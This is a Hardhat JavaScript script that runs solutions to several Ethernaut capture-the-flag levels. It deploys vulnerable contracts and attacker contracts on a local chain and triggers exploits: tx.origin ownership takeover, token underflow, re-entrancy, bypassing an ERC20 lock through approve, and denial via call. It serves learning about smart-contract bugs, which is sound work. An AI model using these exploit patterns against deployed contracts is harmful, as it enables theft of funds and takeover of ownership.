const hre = require("hardhat");
const { deployContract } = require("./helpers");

// Ethernaut Level 4 - Telephone
async function runLevel4() {
  const [, attacker] = await ethers.getSigners();
  const telephone = await deployContract("Telephone");
  const attackParams = [telephone.address];
  const telephoneAttack = await deployContract("TelephoneAttack", attackParams);

  // Solution
  const originalTelephoneOwner = await telephone.owner();
  await telephoneAttack
    .connect(attacker)
    .changeTelephoneOwner(attacker.address);
  const newTelephoneOwner = await telephone.owner();

  console.log(`Original Owner: ${originalTelephoneOwner}`);
  console.log(`New Owner: ${newTelephoneOwner}`);
}

// Ethernaut Level 5 - Token
  // Cause balance to underflow
async function runLevel5() {
  const startingTokens = 20;
  const totalSupply = 21000000;
  const [owner, attacker] = await ethers.getSigners();
  const params = [totalSupply];
  const token = await deployContract("Token", params);
  await token.connect(owner).transfer(attacker.address, startingTokens);

  // Solution
  await token.connect(attacker).transfer(owner.address, startingTokens + 1);
  const attackerBalance = await token.balanceOf(attacker.address);

  console.log(`Attacker Balance: ${attackerBalance}`);
}

// Ethernaut Level 10 - Re-entrancy
// ** attack seems to be working when it's running
// but balance seems to reflect otherwise
async function runLevel10() {
  const [owner] = await ethers.getSigners();
  const reentrance = await deployContract("Reentrance");
  const attackParams = [reentrance.address];
  const reentranceAttack = await deployContract("ReentranceAttack");

  await owner.sendTransaction({
    to: reentrance.address,
    value: ethers.utils.parseEther("10.0"),
  });

  // Solution
  await reentranceAttack.attack(reentranceAttack.address, {
    value: ethers.utils.parseEther("1"),
  });
}

// Ethernaut Level 11 - Elevator
// the contract is partially implemented, an attacker can
// call a self devised functionality from the imcompleted contract
async function runLevel11() {
  const elevator = await deployContract("Elevator");
  const elevatorAttack = await deployContract("ElevatorAttack", [elevator.address]);

  await elevatorAttack.attack();
}

// Ethernaut Level 15 - Naught Coin
// while the transfer function is protected by lockTokens modifer,
// the inherited functions from ERC20 is not, so the takeaway here
// is that a custom contract with inherited standards should
// be throughly protected and implemented if there are custom rules
async function runLevel15() {
  const [, attacker] = await ethers.getSigners();
  const naughtCoin = await deployContract("NaughtCoin", [attacker.address]);
  const naughtCoinAttack = await deployContract("NaughtCoinAttack", [naughtCoin.address]);
 
  // Solution
  const currentBalance = await naughtCoin.balanceOf(attacker.address);
  await naughtCoin.connect(attacker).approve(naughtCoinAttack.address, currentBalance);
  await naughtCoinAttack.connect(attacker).attack(currentBalance);
  const balance = await naughtCoin.balanceOf(attacker.address);

  console.log(`Attacker Balance: ${Number(balance)}`);
}

// Ethernaut Level 20 - Denial
// since call triggers the receiver function of the parent address, 
// it can be used as another form of re-entrancy attack
async function runLevel20() {
  const value = ethers.utils.parseEther("1");
  const denialFactory = await deployContract("DenialFactory");
  const denialAttack = await deployContract("DenialAttack", [denialFactory.address, {value}]);
  await denialAttack.attack();
}

// Ethernaut Level 21 - Shop
// similar to level 11
async function runLevel21() {
  const shop = await deployContract("Shop");
  const shopAttack = await deployContract("ShopAttack", [shop.address]);

  await shopAttack.attack();
}

async function main() {
  // runLevel4();
  // runLevel5();
  // runLevel10();
  // runLevel11();
  // runLevel15();
  // runLevel20();
  runLevel21();
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
